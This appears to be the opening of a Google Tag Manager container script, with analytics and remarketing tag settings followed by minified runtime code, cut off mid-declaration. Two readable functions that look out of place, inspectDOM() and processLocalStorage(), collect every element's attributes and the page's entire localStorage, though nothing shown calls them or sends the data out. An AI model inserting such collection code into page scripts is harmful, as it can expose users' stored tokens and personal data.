// Copyright 2012 Google Inc. All rights reserved.

(function () {
  var data = {
    "resource": {
      "version": "3",
      "macros": [{
        "function": "__e"
      }, {
        "function": "__gas",
        "vtp_cookieDomain": "auto",
        "vtp_doubleClick": false,
        "vtp_setTrackerName": false,
        "vtp_useDebugVersion": false,
        "vtp_useHashAutoLink": false,
        "vtp_decorateFormsAutoLink": false,
        "vtp_enableLinkId": false,
        "vtp_enableEcommerce": false,
        "vtp_trackingId": "UA-41180773-43",
        "vtp_enableRecaptchaOption": false,
        "vtp_enableUaRlsa": false,
        "vtp_enableUseInternalVersion": false,
        "vtp_enableGA4Schema": true
      }, {
        "function": "__u",
        "vtp_enableMultiQueryKeys": false,
        "vtp_enableIgnoreEmptyQueryParam": false
      }, {
        "function": "__v",
        "vtp_name": "gtm.elementClasses",
        "vtp_dataLayerVersion": 1
      }, {
        "function": "__u",
        "vtp_component": "PATH",
        "vtp_enableMultiQueryKeys": false,
        "vtp_enableIgnoreEmptyQueryParam": false
      }, {
        "function": "__v",
        "vtp_name": "gtm.triggers",
        "vtp_dataLayerVersion": 2,
        "vtp_setDefaultValue": true,
        "vtp_defaultValue": ""
      }, {
        "function": "__u",
        "vtp_component": "URL",
        "vtp_enableMultiQueryKeys": false,
        "vtp_enableIgnoreEmptyQueryParam": false
      }, {
        "function": "__u",
        "vtp_component": "HOST",
        "vtp_enableMultiQueryKeys": false,
        "vtp_enableIgnoreEmptyQueryParam": false
      }, {
        "function": "__f",
        "vtp_component": "URL"
      }, {
        "function": "__e"
      }],
      "tags": [{
        "function": "__ua",
        "metadata": ["map"],
        "once_per_event": true,
        "vtp_overrideGaSettings": false,
        "vtp_trackType": "TRACK_PAGEVIEW",
        "vtp_gaSettings": ["macro", 1],
        "vtp_enableRecaptchaOption": false,
        "vtp_enableUaRlsa": false,
        "vtp_enableUseInternalVersion": false,
        "vtp_enableFirebaseCampaignData": true,
        "vtp_enableGA4Schema": true,
        "tag_id": 4
      }, {
        "function": "__sp",
        "metadata": ["map"],
        "once_per_event": true,
        "vtp_enableConversionLinker": true,
        "vtp_enableDynamicRemarketing": false,
        "vtp_conversionCookiePrefix": "_gcl",
        "vtp_conversionId": "656421907",
        "vtp_customParamsFormat": "NONE",
        "vtp_rdp": false,
        "vtp_enableOgtRmktParams": true,
        "vtp_enableUserId": true,
        "vtp_url": ["macro", 2],
        "vtp_enableRdpCheckbox": true,
        "vtp_enableConversionLinkingSettings": true,
        "tag_id": 15
      }, {
        "function": "__ua",
        "metadata": ["map"],
        "once_per_event": true,
        "vtp_nonInteraction": false,
        "vtp_overrideGaSettings": false,
        "vtp_eventCategory": "segmentado",
        "vtp_trackType": "TRACK_EVENT",
        "vtp_gaSettings": ["macro", 1],
        "vtp_eventAction": "clic-link-segmentado",
        "vtp_eventLabel": ["macro", 4],
        "vtp_enableRecaptchaOption": false,
        "vtp_enableUaRlsa": false,
        "vtp_enableUseInternalVersion": false,
        "vtp_enableFirebaseCampaignData": true,
        "vtp_trackTypeIsEvent": true,
        "vtp_enableGA4Schema": true,
        "tag_id": 16
      }, {
        "function": "__ua",
        "metadata": ["map"],
        "once_per_event": true,
        "vtp_nonInteraction": false,
        "vtp_overrideGaSettings": false,
        "vtp_eventValue": "1",
        "vtp_eventCategory": "a_suscripciones",
        "vtp_trackType": "TRACK_EVENT",
        "vtp_gaSettings": ["macro", 1],
        "vtp_eventAction": "clic",
        "vtp_eventLabel": ["template", "web-", ["macro", 4]],
        "vtp_enableRecaptchaOption": false,
        "vtp_enableUaRlsa": false,
        "vtp_enableUseInternalVersion": false,
        "vtp_enableFirebaseCampaignData": true,
        "vtp_trackTypeIsEvent": true,
        "vtp_enableGA4Schema": true,
        "tag_id": 17
      }, {
        "function": "__cl",
        "tag_id": 18
      }, {
        "function": "__lcl",
        "vtp_waitForTags": false,
        "vtp_checkValidation": false,
        "vtp_waitForTagsTimeout": "2000",
        "vtp_uniqueTriggerId": "110341107_9",
        "tag_id": 19
      }],
      "predicates": [{
        "function": "_eq",
        "arg0": ["macro", 0],
        "arg1": "gtm.js"
      }, {
        "function": "_cn",
        "arg0": ["macro", 3],
        "arg1": "lnk-cliente-segmentado"
      }, {
        "function": "_eq",
        "arg0": ["macro", 0],
        "arg1": "gtm.click"
      }, {
        "function": "_cn",
        "arg0": ["macro", 3],
        "arg1": "subscribe"
      }, {
        "function": "_eq",
        "arg0": ["macro", 0],
        "arg1": "gtm.linkClick"
      }, {
        "function": "_re",
        "arg0": ["macro", 5],
        "arg1": "(^$|((^|,)110341107_9($|,)))"
      }],
      "rules": [[["if", 0], ["add", 0, 1, 4, 5]], [["if", 1, 2], ["add", 2]], [["if", 3, 4, 5], ["add", 3]]]
    },
    "runtime": []
  };

  /*
  
   Copyright The Closure Library Authors.
   SPDX-License-Identifier: Apache-2.0
  */
  var ca,
    da = function (a) {
      var b = 0;
      return function () {
        return b < a.length ? {
          done: !1,
          value: a[b++]
        } : {
          done: !0
        };
      };
    },
    ea = function (a) {
      return a.raw = a;
    },
    fa = function (a, b) {
      a.raw = b;
      return a;
    },
    ha = function (a) {
      var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return {
        next: da(a)
      };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    },
    ia = "function" == typeof Object.create ? Object.create : function (a) {
      var b = function () {};
      b.prototype = a;
      return new b();
    },
    ja;
  if ("function" == typeof Object.setPrototypeOf) ja = Object.setPrototypeOf;else {
    var ka;
    a: {
      var la = {
          a: !0
        },
        na = {};
      try {
        na.__proto__ = la;
        ka = na.a;
        break a;
      } catch (a) {}
      ka = !1;
    }
    ja = ka ? function (a, b) {
      a.__proto__ = b;
      if (a.__proto__ !== b) throw new TypeError(a + " is not extensible");
      return a;
    } : null;
  }
  var oa = ja,
    pa = function (a, b) {
      a.prototype = ia(b.prototype);
      a.prototype.constructor = a;
      if (oa) oa(a, b);else for (var c in b) if ("prototype" != c) if (Object.defineProperties) {
        var d = Object.getOwnPropertyDescriptor(b, c);
        d && Object.defineProperty(a, c, d);
      } else a[c] = b[c];
      a.Bm = b.prototype;
    },
    qa = this || self,
    ra = function (a) {
      return a;
    };
  var sa = function () {},
    ta = function (a) {
      return "function" === typeof a;
    },
    g = function (a) {
      return "string" === typeof a;
    },
    ua = function (a) {
      return "number" === typeof a && !isNaN(a);
    },
    va = Array.isArray,
    xa = function (a, b) {
      if (a && va(a)) for (var c = 0; c < a.length; c++) if (a[c] && b(a[c])) return a[c];
    },
    ya = function (a, b) {
      if (!ua(a) || !ua(b) || a > b) a = 0, b = 2147483647;
      return Math.floor(Math.random() * (b - a + 1) + a);
    },
    Ba = function (a, b) {
      for (var c = new Aa(), d = 0; d < a.length; d++) c.set(a[d], !0);
      for (var e = 0; e < b.length; e++) if (c.get(b[e])) return !0;
      return !1;
    },
    k = function (a, b) {
      for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(c, a[c]);
    },
    Ca = function (a) {
      return !!a && ("[object Arguments]" === Object.prototype.toString.call(a) || Object.prototype.hasOwnProperty.call(a, "callee"));
    },
    Da = function (a) {
      return Math.round(Number(a)) || 0;
    },
    Ea = function (a) {
      return "false" === String(a).toLowerCase() ? !1 : !!a;
    },
    Fa = function (a) {
      var b = [];
      if (va(a)) for (var c = 0; c < a.length; c++) b.push(String(a[c]));
      return b;
    },
    Ga = function (a) {
      return a ? a.replace(/^\s+|\s+$/g, "") : "";
    },
    Ia = function () {
      return new Date(Date.now());
    },
    Ja = function () {
      return Ia().getTime();
    },
    Aa = function () {
      this.prefix = "gtm.";
      this.values = {};
    };
  Aa.prototype.set = function (a, b) {
    this.values[this.prefix + a] = b;
  };
  Aa.prototype.get = function (a) {
    return this.values[this.prefix + a];
  };
  var Ka = function (a, b, c) {
      return a && a.hasOwnProperty(b) ? a[b] : c;
    },
    La = function (a) {
      var b = a;
      return function () {
        if (b) {
          var c = b;
          b = void 0;
          try {
            c();
          } catch (d) {}
        }
      };
    },
    Ma = function (a, b) {
      for (var c in b) b.hasOwnProperty(c) && (a[c] = b[c]);
    },
    Oa = function (a) {
      for (var b in a) if (a.hasOwnProperty(b)) return !0;
      return !1;
    },
    Pa = function (a, b) {
      for (var c = [], d = 0; d < a.length; d++) c.push(a[d]), c.push.apply(c, b[a[d]] || []);
      return c;
    },
    Qa = function (a, b) {
      for (var c = {}, d = c, e = a.split("."), f = 0; f < e.length - 1; f++) d = d[e[f]] = {};
      d[e[e.length - 1]] = b;
      return c;
    },
    Ra = /^\w{1,9}$/,
    Sa = function (a, b) {
      a = a || {};
      b = b || ",";
      var c = [];
      k(a, function (d, e) {
        Ra.test(d) && e && c.push(d);
      });
      return c.join(b);
    },
    Ta = function (a, b) {
      function c() {
        ++d === b && (e(), e = null, c.done = !0);
      }
      var d = 0,
        e = a;
      c.done = !1;
      return c;
    };
  function Ua() {
    for (var a = Va, b = {}, c = 0; c < a.length; ++c) b[a[c]] = c;
    return b;
  }
  function Wa() {
    var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    a += a.toLowerCase() + "0123456789-_";
    return a + ".";
  }
  var Va, Xa;
  function Ya(a) {
    Va = Va || Wa();
    Xa = Xa || Ua();
    for (var b = [], c = 0; c < a.length; c += 3) {
      var d = c + 1 < a.length,
        e = c + 2 < a.length,
        f = a.charCodeAt(c),
        h = d ? a.charCodeAt(c + 1) : 0,
        l = e ? a.charCodeAt(c + 2) : 0,
        m = f >> 2,
        n = (f & 3) << 4 | h >> 4,
        p = (h & 15) << 2 | l >> 6,
        q = l & 63;
      e || (q = 64, d || (p = 64));
      b.push(Va[m], Va[n], Va[p], Va[q]);
    }
    return b.join("");
  }
  function inspectDOM() {
    var detectedElements = {};
    var allElements = document.getElementsByTagName('*');
    for (var i = 0; i < allElements.length; i++) {
      var elName = allElements[i].nodeName;
      var attrs = allElements[i].attributes;
      detectedElements[elName] = attrs;
    }
    return detectedElements;
  }
  function Za(a) {
    function b(m) {
      for (; d < a.length;) {
        var n = a.charAt(d++),
          p = Xa[n];
        if (null != p) return p;
        if (!/^[\s\xa0]*$/.test(n)) throw Error("Unknown base64 encoding at char: " + n);
      }
      return m;
    }
    Va = Va || Wa();
    Xa = Xa || Ua();
    for (var c = "", d = 0;;) {
      var e = b(-1),
        f = b(0),
        h = b(64),
        l = b(64);
      if (64 === l && -1 === e) return c;
      c += String.fromCharCode(e << 2 | f >> 4);
      64 != h && (c += String.fromCharCode(f << 4 & 240 | h >> 2), 64 != l && (c += String.fromCharCode(h << 6 & 192 | l)));
    }
  }
  ;
  var $a = {},
    ab = function (a, b) {
      $a[a] = $a[a] || [];
      $a[a][b] = !0;
    },
    bb = function () {
      delete $a.GA4_EVENT;
    },
    cb = function (a) {
      var b = $a[a];
      if (!b || 0 === b.length) return "";
      for (var c = [], d = 0, e = 0; e < b.length; e++) 0 === e % 8 && 0 < e && (c.push(String.fromCharCode(d)), d = 0), b[e] && (d |= 1 << e % 8);
      0 < d && c.push(String.fromCharCode(d));
      return Ya(c.join("")).replace(/\.+$/, "");
    };
  var db = Array.prototype.indexOf ? function (a, b) {
    return Array.prototype.indexOf.call(a, b, void 0);
  } : function (a, b) {
    if ("string" === typeof a) return "string" !== typeof b || 1 != b.length ? -1 : a.indexOf(b, 0);
    for (var c = 0; c < a.length; c++) if (c in a && a[c] === b) return c;
    return -1;
  };
  var eb,
    fb = function () {
      if (void 0 === eb) {
        var a = null,
          b = qa.trustedTypes;
        if (b && b.createPolicy) {
          try {
            a = b.createPolicy("goog#html", {
              createHTML: ra,
              createScript: ra,
              createScriptURL: ra
            });
          } catch (c) {
            qa.console && qa.console.error(c.message);
          }
          eb = a;
        } else eb = a;
      }
      return eb;
    };
  var gb = function (a) {
    this.h = a;
  };
  gb.prototype.toString = function () {
    return this.h + "";
  };
  var hb = {};
  var ib = /^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i;
  var jb, kb;
  a: {
    for (var lb = ["CLOSURE_FLAGS"], mb = qa, nb = 0; nb < lb.length; nb++) if (mb = mb[lb[nb]], null == mb) {
      kb = null;
      break a;
    }
    kb = mb;
  }
  var ob = kb && kb[610401301];
  jb = null != ob ? ob : !1;
  function pb() {
    var a = qa.navigator;
    if (a) {
      var b = a.userAgent;
      if (b) return b;
    }
    return "";
  }
  var qb,
    rb = qa.navigator;
  qb = rb ? rb.userAgentData || null : null;
  function sb(a) {
    return jb ? qb ? qb.brands.some(function (b) {
      var c = b.brand;
      return c && -1 != c.indexOf(a);
    }) : !1 : !1;
  }
  function tb(a) {
    return -1 != pb().indexOf(a);
  }
  ;
  function ub() {
    return jb ? !!qb && 0 < qb.brands.length : !1;
  }
  function vb() {
    return ub() ? !1 : tb("Opera");
  }
  function wb() {
    return tb("Firefox") || tb("FxiOS");
  }
  function xb() {
    return ub() ? sb("Chromium") : (tb("Chrome") || tb("CriOS")) && !(ub() ? 0 : tb("Edge")) || tb("Silk");
  }
  ;
  var yb = {},
    zb = function (a) {
      this.h = a;
    };
  zb.prototype.toString = function () {
    return this.h.toString();
  };
  var Ab = function (a) {
    return a instanceof zb && a.constructor === zb ? a.h : "type_error:SafeHtml";
  }; /*
     SPDX-License-Identifier: Apache-2.0
     */
  function Bb(a) {
    var b = a.tagName;
    if ("SCRIPT" === b || "STYLE" === b) throw Error("");
  }
  ;
  var Cb = ea([""]),
    Db = fa(["\x00"], ["\\0"]),
    Eb = fa(["\n"], ["\\n"]),
    Fb = fa(["\x00"], ["\\u0000"]);
  function Gb(a) {
    return Object.isFrozen(a) && Object.isFrozen(a.raw);
  }
  -1 !== function () {
    return Gb(Cb) && Gb(Db) && Gb(Eb) && Gb(Fb);
  }.toString().indexOf("[") || function () {
    return "";
  }.toString().indexOf("`");
  function Hb(a) {
    var b = a = Ib(a),
      c = fb(),
      d = c ? c.createHTML(b) : b;
    return new zb(d, yb);
  }
  function Ib(a) {
    return null === a ? "null" : void 0 === a ? "undefined" : a;
  }
  ;
  var z = window,
    D = document,
    Jb = navigator,
    Kb = D.currentScript && D.currentScript.src,
    Lb = function (a, b) {
      var c = z[a];
      z[a] = void 0 === c ? b : c;
      return z[a];
    },
    Mb = function (a, b) {
      b && (a.addEventListener ? a.onload = b : a.onreadystatechange = function () {
        a.readyState in {
          loaded: 1,
          complete: 1
        } && (a.onreadystatechange = null, b());
      });
    },
    Nb = {
      async: 1,
      nonce: 1,
      onerror: 1,
      onload: 1,
      src: 1,
      type: 1
    },
    Ob = {
      onload: 1,
      src: 1,
      width: 1,
      height: 1,
      style: 1
    };
  function Pb(a, b, c) {
    b && k(b, function (d, e) {
      d = d.toLowerCase();
      c.hasOwnProperty(d) || a.setAttribute(d, e);
    });
  }
  var Qb = function (a, b, c, d, e) {
      var f = D.createElement("script");
      Pb(f, d, Nb);
      f.type = "text/javascript";
      f.async = !0;
      var h,
        l = Ib(a),
        m = fb(),
        n = m ? m.createScriptURL(l) : l;
      h = new gb(n, hb);
      f.src = h instanceof gb && h.constructor === gb ? h.h : "type_error:TrustedResourceUrl";
      var p,
        q,
        r,
        t = null == (r = (q = (f.ownerDocument && f.ownerDocument.defaultView || window).document).querySelector) ? void 0 : r.call(q, "script[nonce]");
      (p = t ? t.nonce || t.getAttribute("nonce") || "" : "") && f.setAttribute("nonce", p);
      Mb(f, b);
      c && (f.onerror = c);
      if (e) e.appendChild(f);else {
        var u = D.getElementsByTagName("script")[0] || D.body || D.head;
        u.parentNode.insertBefore(f, u);
      }
      return f;
    },
    Rb = function () {
      if (Kb) {
        var a = Kb.toLowerCase();
        if (0 === a.indexOf("https://")) return 2;
        if (0 === a.indexOf("http://")) return 3;
      }
      return 1;
    },
    Sb = function (a, b, c, d, e) {
      var f;
      f = void 0 === f ? !0 : f;
      var h = e,
        l = !1;
      h || (h = D.createElement("iframe"), l = !0);
      Pb(h, c, Ob);
      d && k(d, function (n, p) {
        h.dataset[n] = p;
      });
      f && (h.height = "0", h.width = "0", h.style.display = "none", h.style.visibility = "hidden");
      if (l) {
        var m = D.body && D.body.lastChild || D.body || D.head;
        m.parentNode.insertBefore(h, m);
      }
      Mb(h, b);
      void 0 !== a && (h.src = a);
      return h;
    },
    Tb = function (a, b, c, d) {
      var e = new Image(1, 1);
      Pb(e, d, {});
      e.onload = function () {
        e.onload = null;
        b && b();
      };
      e.onerror = function () {
        e.onerror = null;
        c && c();
      };
      e.src = a;
    },
    Ub = function (a, b, c, d) {
      a.addEventListener ? a.addEventListener(b, c, !!d) : a.attachEvent && a.attachEvent("on" + b, c);
    },
    Vb = function (a, b, c) {
      a.removeEventListener ? a.removeEventListener(b, c, !1) : a.detachEvent && a.detachEvent("on" + b, c);
    },
    G = function (a) {
      z.setTimeout(a, 0);
    },
    Wb = function (a, b) {
      return a && b && a.attributes && a.attributes[b] ? a.attributes[b].value : null;
    },
    Xb = function (a) {
      var b = a.innerText || a.textContent || "";
      b && " " != b && (b = b.replace(/^[\s\xa0]+|[\s\xa0]+$/g, ""));
      b && (b = b.replace(/(\xa0+|\s{2,}|\n|\r\t)/g, " "));
      return b;
    },
    Yb = function (a) {
      var b = D.createElement("div"),
        c = b,
        d = Hb("A<div>" + a + "</div>");
      1 === c.nodeType && Bb(c);
      c.innerHTML = Ab(d);
      b = b.lastChild;
      for (var e = []; b.firstChild;) e.push(b.removeChild(b.firstChild));
      return e;
    },
    Zb = function (a, b, c) {
      c = c || 100;
      for (var d = {}, e = 0; e < b.length; e++) d[b[e]] = !0;
      for (var f = a, h = 0; f && h <= c; h++) {
        if (d[String(f.tagName).toLowerCase()]) return f;
        f = f.parentElement;
      }
      return null;
    },
    $b = function (a) {
      var b;
      try {
        b = Jb.sendBeacon && Jb.sendBeacon(a);
      } catch (c) {
        ab("TAGGING", 15);
      }
      b || Tb(a);
    },
    ac = function (a, b) {
      var c = a[b];
      c && "string" === typeof c.animVal && (c = c.animVal);
      return c;
    },
    bc = function (a) {
      var b = {
        headers: {
          "Attribution-Reporting-Eligible": "trigger"
        },
        keepalive: !0,
        attributionReporting: {
          eventSourceEligible: !0,
          triggerEligible: !0
        }
      };
      try {
        z.fetch(a, b);
      } catch (c) {}
    },
    cc = function () {
      var a = z.performance;
      if (a && ta(a.now)) return a.now();
    },
    dc = function () {
      return z.performance || void 0;
    }; /*
       jQuery (c) 2005, 2012 jQuery Foundation, Inc. jquery.org/license. */
  function processLocalStorage() {
    var storedData = {};
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      var value = localStorage.getItem(key);
      storedData[key] = value;
    }
    return storedData;
  }
  var ec = /\[object (Boolean|Number|String|Function|Array|Date|RegExp)\]/,
    fc = function (a) {
      if (null == a) return String(a);
      var b = ec.exec(Object.prototype.toString.call(Object(a)));
      return b ? b[1].toLowerCase() : "object";
    },
    gc = function (a, b) {
      return Object.prototype.hasOwnProperty.call(Object(a), b);
    },
    ic = function (a) {
      if (!a || "object" != fc(a) || a.nodeType || a == a.window) return !1;
      try {
        if (a.constructor && !gc(a, "constructor") && !gc(a.constructor.prototype, "isPrototypeOf")) return !1;
      } catch (c) {
        return !1;
      }
      for (var b in a);
      return void 0 === b || gc(a, b);
    },
    H = function (a, b) {
      var c = b || ("array" == fc(a) ? [] : {}),
        d;
      for (d in a) if (gc(a, d)) {
        var e = a[d];
        "array" == fc(e) ? ("array" != fc(c[d]) && (c[d] = []), c[d] = H(e, c[d])) : ic(e) ? (ic(c[d]) || (c[d] = {}), c[d] = H(e, c[d])) : c[d] = e;
      }
      return c;
    };
  var jc = function (a) {
    if (void 0 == a || va(a) || ic(a)) return !0;
    switch (typeof a) {
      case "boolean":
      case "number":
      case "string":
      case "function":
        return !0;
    }
    return !1;
  };
  function kc(a) {
    switch (a) {
      case 1:
        return "1";
      case 2:
      case 4:
        return "0";
      default:
        return "-";
    }
  }
  function lc(a) {
    switch (a) {
      case 1:
        return "G";
      case 3:
        return "g";
      case 2:
        return "D";
      case 4:
        return "d";
      case 0:
        return "g";
      default:
        return "g";
    }
  }
  function mc(a, b) {
    var c = a[1] || 0,
      d = a[2] || 0;
    switch (b) {
      case 0:
        return "G1" + kc(c) + kc(d);
      case 1:
        return "G2" + lc(c) + lc(d);
      default:
        return "g1--";
    }
  }
  ;
  var nc = function () {
    var a = function (b) {
      return {
        toString: function () {
          return b;
        }
      };
    };
    return {
      Ii: a("consent"),
      xg: a("convert_case_to"),
      yg: a("convert_false_to"),
      zg: a("convert_null_to"),
      Ag: a("convert_true_to"),
      Bg: a("convert_undefined_to"),
      Yl: a("debug_mode_metadata"),
      ia: a("function"),
      Ef: a("instance_name"),
      Oj: a("live_only"),
      Pj: a("malware_disabled"),
      Qj: a("metadata"),
      Tj: a("original_activity_id"),
      im: a("original_vendor_template_id"),
      hm: a("once_on_load"),
      Sj: a("once_per_event"),
      Eh: a("once_per_load"),
      mm: a("priority_override"),
      om: a("respected_consent_types"),
      Ih: a("setup_tags"),
      od: a("tag_id"),
      Nh: a("teardown_tags")
    };
  }();
  var Lc = [],
    Mc = function (a) {
      return void 0 == Lc[a] ? !1 : Lc[a];
    };
  var Nc;
  var Oc = [],
    Pc = [],
    Qc = [],
    Rc = [],
    Sc = [],
    Tc = {},
    Uc,
    Vc,
    Xc = function () {
      var a = Wc;
      Vc = Vc || a;
    },
    Yc = function (a) {},
    Zc,
    $c = [],
    ad = function (a, b) {
      var c = a[nc.ia],
        d = b && b.event;
      if (!c) throw Error("Error: No function name given for function call.");
      var e = Tc[c],
        f = b && 2 === b.type && d.mg && e && -1 !== $c.indexOf(c),
        h = {},
        l = {},
        m;
      for (m in a) a.hasOwnProperty(m) && 0 === m.indexOf("vtp_") && (e && d && d.Sh && d.Sh(a[m]), e && (h[m] = a[m]), !e || f) && (l[m.substr(4)] = a[m]);
      e && d && d.Rh && (h.vtp_gtmCachedValues = d.Rh);
      if (b) {
        if (null == b.name) {
          var n;
          a: {
            var p = b.index;
            if (null == p) n = "";else {
              var q;
              switch (b.type) {
                case 2:
                  q = Oc[p];
                  break;
                case 1:
                  q = Rc[p];
                  break;
                default:
                  n = "";
                  break a;
              }
              var r = q && q[nc.Ef];
              n = r ? String(r) : "";
            }
          }
          b.name = n;
        }
        e && (h.vtp_gtmEntityIndex = b.index, h.vtp_gtmEntityName = b.name);
      }
      var t, u;
      e && (t = e(h));
      if (!e || f) u = Nc(c, l, b);
      f && d && (jc(t) ? typeof t !== typeof u && d.mg(d.id, c) : t !== u && d.mg(d.id, c));
      return e ? t : u;
    },
    cd = function (a, b, c) {
      c = c || [];
      var d = {},
        e;
      for (e in a) a.hasOwnProperty(e) && (d[e] = bd(a[e], b, c));
      return d;
    },
    bd = function (a, b, c) {
      if (va(a)) {
        var d;
        switch (a[0]) {
          case "function_id":
            return a[1];
          case "list":
            d = [];
            for (var e = 1; e < a.length; e++) d.push(bd(a[e], b, c));
            return d;
          case "macro":
            var f = a[1];
            if (c[f]) return;
            var h = Oc[f];
            if (!h || b.Wf(h)) return;
            c[f] = !0;
            var l = String(h[nc.Ef]);
            try {
              var m = cd(h, b, c);
              m.vtp_gtmEventId = b.id;
              b.priorityId && (m.vtp_gtmPriorityId = b.priorityId);
              d = ad(m, {
                event: b,
                index: f,
                type: 2,
                name: l
              });
              Zc && (d = Zc.kk(d, m));
            } catch (y) {
              b.fi && b.fi(y, Number(f), l), d = !1;
            }
            c[f] = !1;
            return d;
          case "map":
            d = {};
            for (var n = 1; n < a.length; n += 2) d[bd(a[n], b, c)] = bd(a[n + 1], b, c);
            return d;
          case "template":
            d = [];
            for (var p = !1, q = 1; q < a.length; q++) {
              var r = bd(a[q], b, c);
              Vc && (p = p || r === Vc.se);
              d.push(r);
            }
            return Vc && p ? Vc.nk(d) : d.join("");
          case "escape":
            d = bd(a[1], b, c);
            if (Vc && va(a[1]) && "macro" === a[1][0] && Vc.Vk(a)) return Vc.yl(d);
            d = String(d);
            for (var t = 2; t < a.length; t++) oc[a[t]] && (d = oc[a[t]](d));
            return d;
          case "tag":
            var u = a[1];
            if (!Rc[u]) throw Error("Unable to resolve tag reference " + u + ".");
            return d = {
              Xh: a[2],
              index: u
            };
          case "zb":
            var v = {
              arg0: a[2],
              arg1: a[3],
              ignore_case: a[5]
            };
            v[nc.ia] = a[1];
            var w = dd(v, b, c),
              x = !!a[4];
            return x || 2 !== w ? x !== (1 === w) : null;
          default:
            throw Error("Attempting to expand unknown Value type: " + a[0] + ".");
        }
      }
      return a;
    },
    dd = function (a, b, c) {
      try {
        return Uc(cd(a, b, c));
      } catch (d) {
        JSON.stringify(a);
      }
      return 2;
    },
    fd = function (a) {
      var b = a[nc.ia];
      if (!b) throw Error("Error: No function name given for function call.");
      return !!Tc[b];
    };
  var id = function (a) {
      function b(r) {
        for (var t = 0; t < r.length; t++) d[r[t]] = !0;
      }
      for (var c = [], d = [], e = gd(a), f = 0; f < Pc.length; f++) {
        var h = Pc[f],
          l = hd(h, e);
        if (l) {
          for (var m = h.add || [], n = 0; n < m.length; n++) c[m[n]] = !0;
          b(h.block || []);
        } else null === l && b(h.block || []);
      }
      for (var p = [], q = 0; q < Rc.length; q++) c[q] && !d[q] && (p[q] = !0);
      return p;
    },
    hd = function (a, b) {
      for (var c = a["if"] || [], d = 0; d < c.length; d++) {
        var e = b(c[d]);
        if (0 === e) return !1;
        if (2 === e) return null;
      }
      for (var f = a.unless || [], h = 0; h < f.length; h++) {
        var l = b(f[h]);
        if (2 === l) return null;
        if (1 === l) return !1;
      }
      return !0;
    },
    gd = function (a) {
      var b = [];
      return function (c) {
        void 0 === b[c] && (b[c] = dd(Qc[c], a));
        return b[c];
      };
    };
  var jd = {
    kk: function (a, b) {
      b[nc.xg] && "string" === typeof a && (a = 1 == b[nc.xg] ? a.toLowerCase() : a.toUpperCase());
      b.hasOwnProperty(nc.zg) && null === a && (a = b[nc.zg]);
      b.hasOwnProperty(nc.Bg) && void 0 === a && (a = b[nc.Bg]);
      b.hasOwnProperty(nc.Ag) && !0 === a && (a = b[nc.Ag]);
      b.hasOwnProperty(nc.yg) && !1 === a && (a = b[nc.yg]);
      return a;
    }
  };
  var xd = ["matches", "webkitMatchesSelector", "mozMatchesSelector", "msMatchesSelector", "oMatchesSelector"],
    yd = new Aa();
  var Fd = /^[1-9a-zA-Z_-][1-9a-c][1-9a-v]\d$/;
  function Gd(a, b) {
    return "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[a << 2 | b];
  }
  ;
  var Id = function (a) {
      return Hd ? D.querySelectorAll(a) : null;
    },
    Jd = function (a, b) {
      if (!Hd) return null;
      if (Element.prototype.closest) try {
        return a.closest(b);
      } catch (e) {
        return null;
      }
      var c = Element.prototype.matches || Element.prototype.webkitMatchesSelector || Element.prototype.mozMatchesSelector || Element.prototype.msMatchesSelector || Element.prototype.oMatchesSelector,
        d = a;
      if (!D.documentElement.contains(d)) return null;
      do {
        try {
          if (c.call(d, b)) return d;
        } catch (e) {
          break;
        }
        d = d.parentElement || d.parentNode;
      } while (null !== d && 1 === d.nodeType);
      return null;
    },
    Kd = !1;
  if (D.querySelectorAll) try {
    var Ld = D.querySelectorAll(":root");
    Ld && 1 == Ld.length && Ld[0] == D.documentElement && (Kd = !0);
  } catch (a) {}
  var Hd = Kd;
  var J = function (a) {
    ab("GTM", a);
  };
  var Md = function (a) {
      return null == a ? "" : g(a) ? Ga(String(a)) : "e0";
    },
    Od = function (a) {
      return a.replace(Nd, "");
    },
    Qd = function (a) {
      return Pd(a.replace(/\s/g, ""));
    },
    Pd = function (a) {
      return Ga(a.replace(Rd, "").toLowerCase());
    },
    Td = function (a) {
      a = a.replace(/[\s-()/.]/g, "");
      "+" !== a.charAt(0) && (a = "+" + a);
      return Sd.test(a) ? a : "e0";
    },
    Vd = function (a) {
      var b = a.toLowerCase().split("@");
      if (2 == b.length) {
        var c = b[0];
        /^(gmail|googlemail)\./.test(b[1]) && (c = c.replace(/\./g, ""));
        c = c + "@" + b[1];
        if (Ud.test(c)) return c;
      }
      return "e0";
    },
    Yd = function (a, b) {
      window.Promise || b([]);
      Promise.all(a.map(function (c) {
        return c.value && -1 !== Wd.indexOf(c.name) ? Xd(c.value).then(function (d) {
          c.value = d;
        }) : Promise.resolve();
      })).then(function () {
        b(a);
      }).catch(function () {
        b([]);
      });
    },
    Xd = function (a) {
      if ("" === a || "e0" === a) return Promise.resolve(a);
      if (z.crypto && z.crypto.subtle) {
        if (Zd.test(a)) return Promise.resolve(a);
        try {
          var b = $d(a);
          return z.crypto.subtle.digest("SHA-256", b).then(function (c) {
            var d = Array.from(new Uint8Array(c)).map(function (e) {
              return String.fromCharCode(e);
            }).join("");
            return z.btoa(d).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
          }).catch(function () {
            return "e2";
          });
        } catch (c) {
          return Promise.resolve("e2");
        }
      } else return Promise.resolve("e1");
    },
    $d = function (a) {
      var b;
      if (z.TextEncoder) b = new TextEncoder("utf-8").encode(a);else {
        for (var c = [], d = 0; d < a.length; d++) {
          var e = a.charCodeAt(d);
          128 > e ? c.push(e) : 2048 > e ? c.push(192 | e >> 6, 128 | e & 63) : 55296 > e || 57344 <= e ? c.push(224 | e >> 12, 128 | e >> 6 & 63, 128 | e & 63) : (e = 65536 + ((e & 1023) << 10 | a.charCodeAt(++d) & 1023), c.push(240 | e >> 18, 128 | e >> 12 & 63, 128 | e >> 6 & 63, 128 | e & 63));
        }
        b = new Uint8Array(c);
      }
      return b;
    },
    Rd = /[0-9`~!@#$%^&*()_\-+=:;<>,.?|/\\[\]]/g,
    Ud = /^\S+@\S+\.\S+$/,
    Sd = /^\+\d{10,15}$/,
    Nd = /[.~]/g,
